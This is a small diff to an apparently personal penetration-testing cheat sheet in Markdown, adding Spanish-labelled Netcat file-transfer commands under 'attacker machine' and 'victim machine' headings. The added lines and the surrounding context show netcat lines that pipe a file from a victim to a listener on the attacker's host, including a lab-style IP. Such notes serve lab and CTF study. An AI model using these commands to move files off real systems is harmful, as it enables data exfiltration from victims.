@@ -80,6 +80,12 @@ ftp <SERVER_IP>
 
 ### Netcat
 ```python
+	maquina atacante
+	nc -lvnp "Ports" > "archivo"
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+	maquina victima
+	nc "IP" "Ports" < "archivo"
+
 #Servidor
 
 nc 10.10.14.2 4242 < file.tgz
